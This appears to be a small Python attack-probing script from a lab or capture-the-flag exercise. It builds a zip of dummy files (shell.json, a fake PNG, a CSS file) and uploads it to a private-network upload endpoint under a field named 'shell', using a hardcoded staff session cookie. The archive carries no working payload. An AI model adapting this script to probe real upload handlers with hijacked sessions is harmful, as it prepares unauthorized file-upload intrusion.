import requests
import zipfile
import os

target_url = "http://10.65.146.116:5000/upload"
cookie = {"session": "eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.apJuOQ.yWRtVVvgsw0Qk9NzdbGSakknWXI"}

def create_zip(filename, files):
    with zipfile.ZipFile(filename, 'w') as z:
        for file, content in files.items():
            z.writestr(file, content)

def upload_zip(zip_path):
    with open(zip_path, 'rb') as f:
        files = {'shell': (os.path.basename(zip_path), f, 'application/zip')}
        r = requests.post(target_url, files=files, cookies=cookie)
        return r.status_code, r.text

if __name__ == "__main__":
    create_zip("display_test_2.zip", {
        "shell.json": '{"assets": ["test.png", "style.css"]}',
        "test.png": "fake png",
        "style.css": "body { background: red; }"
    })
    upload_zip("display_test_2.zip")
